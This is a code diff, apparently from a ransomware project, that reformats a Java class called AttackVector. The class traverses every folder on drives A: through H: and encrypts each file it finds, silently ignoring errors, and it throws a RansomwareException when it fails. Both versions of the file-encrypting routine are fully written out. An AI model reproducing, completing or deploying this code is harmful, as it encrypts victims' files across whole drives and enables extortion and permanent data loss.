@@ -13,65 +13,61 @@ import Agent.traversal.*;
 public class AttackVector {
 
 	// Check if specific directory is already found in the folder tree
-		private boolean isVisitedFolder(File file, Collection<File> folderTree) {
-			if (folderTree == null) {
-				return false;
-			}
-
-			else {
-				boolean isExist = false;
-				String tocheck = file.getName();
-				isExist = folderTree.stream().anyMatch(t -> t.getName() == tocheck);
-				return isExist;
-			}
-
+	private boolean isVisitedFolder(File file, Collection<File> folderTree) {
+		if (folderTree == null) {
+			return false;
 		}
 
-		public void traverseAndEncrypt(String inputDir, Collection<File> dirs, CryptoKey key,Traverse struct) {
+		else {
+			boolean isExist = false;
+			String tocheck = file.getName();
+			isExist = folderTree.stream().anyMatch(t -> t.getName() == tocheck);
+			return isExist;
+		}
 
-			struct.add(new File(inputDir));
-			while (!(struct.isEmpty())) {
-				/* get next file/directory */
-				File current = struct.remove();
+	}
 
-				File[] fileDirList = current.listFiles();
+	public void traverseAndEncrypt(String inputDir, Collection<File> dirs, CryptoKey key, Traverse struct) {
 
-				if (fileDirList != null) {
-					for (File file : fileDirList) {
-						if (file.isDirectory()) {
-							try {
+		struct.add(new File(inputDir));
+		while (!(struct.isEmpty())) {
+			/* get next file/directory */
+			File current = struct.remove();
 
-								if (!(isVisitedFolder(file, dirs))) {
+			File[] fileDirList = current.listFiles();
 
-									dirs.add(file);
+			if (fileDirList != null) {
+				for (File file : fileDirList) {
+					if (file.isDirectory()) {
 
-								}
-							} catch (NullPointerException e) {
+						if (!(isVisitedFolder(file, dirs))) {
 
-							}
-							struct.add(file);
+							dirs.add(file);
 
-						} else if (file.isFile()) {
-							JavaCryptoUtil crypto = new JavaCryptoUtil();
-							try {
-								crypto.encrypt(key.getKey(), file, key.getAlgorithm());
-							} catch (CryptoException e) {
+						}
 
-							}
+						struct.add(file);
+
+					} else if (file.isFile()) {
+						JavaCryptoUtil crypto = new JavaCryptoUtil();
+						try {
+							crypto.encrypt(key.getKey(), file, key.getAlgorithm());
+						} catch (CryptoException e) {
+
 						}
 					}
-
 				}
+
 			}
 		}
+	}
 
-	
 	private void attack(String inputDir, Collection<File> dirs, CryptoKey key) {
 		Traverse dfs = new DFS();
-		traverseAndEncrypt(inputDir, dirs, key,dfs);
+		traverseAndEncrypt(inputDir, dirs, key, dfs);
 		// or
 		Traverse bfs = new BFS();
-		traverseAndEncrypt(inputDir, dirs, key,bfs);
+		traverseAndEncrypt(inputDir, dirs, key, bfs);
 	}
 
 	public void encryptFileSystem() throws RansomwareException {
@@ -81,7 +77,7 @@ public class AttackVector {
 			for (char i = 'A'; i <= 'H'; i++) {
 				attack(i + ":\\", visitedFolders, key.getKey());
 			}
-		} catch (Exception e) { 
+		} catch (Exception e) {
 			throw new RansomwareException();
 		}
 	}
